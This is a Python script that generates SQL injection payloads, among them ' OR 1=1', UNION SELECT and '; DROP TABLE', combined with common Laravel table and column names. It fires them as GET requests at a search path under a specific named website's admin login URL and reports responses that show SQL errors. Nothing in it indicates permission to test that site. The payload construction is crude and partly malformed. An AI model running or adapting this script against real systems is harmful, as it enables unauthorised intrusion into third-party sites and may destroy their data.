import requests

# Base URL of the Laravel website
base_url = 'https://training.host4india.in/durgesh2/admin/login'

# List of common injection keywords
injection_keywords = [
    " OR 1=1",
    "; DROP TABLE",
    "' OR '1'='1",
    " UNION SELECT",
    " AND 1=1",
    "' AND '1'='1",
    "--",
    "#",
    "/*",
    "*/",
    " OR true",
    "' OR true",
    " AND true",
    "' AND true",
    " OR false",
    "' OR false",
    " AND false",
    "' AND false",
    " OR 1=1 --",
    "' OR 1=1 --",
    " AND 1=1 --",
    "' AND 1=1 --",
    " OR '1'='1",
    "' OR '1'='1",
    " AND '1'='1",
    "' AND '1'='1",
]

# List of common table and column names in Laravel
table_names = [
    "users",
    "posts",
    "comments",
    "products",
    # Add more table names here as needed
]

column_names = [
    "id",
    "name",
    "email",
    "password",
    "created_at",
    "updated_at",
    # Add more column names here as needed
]

# Generate injection strings
injection_strings = []
for keyword in injection_keywords:
    for table in table_names:
        for column in column_names:
            injection = f"'{keyword} FROM {table} WHERE {column} = '{keyword}"
            injection_strings.append(injection)

def test_sql_injections(url):
    for injection in injection_strings:
        test_url = f"{url}/search?q={injection}"
        response = requests.get(test_url)

        if "error in your SQL syntax" in response.text or "SQLSTATE" in response.text:
            print(f"Potential SQL injection found: {test_url}")
        else:
            print(f"Safe: {test_url}")

def main():
    # Perform SQL injection tests on the Laravel website
    test_sql_injections(base_url)

if __name__ == "__main__":
    main()
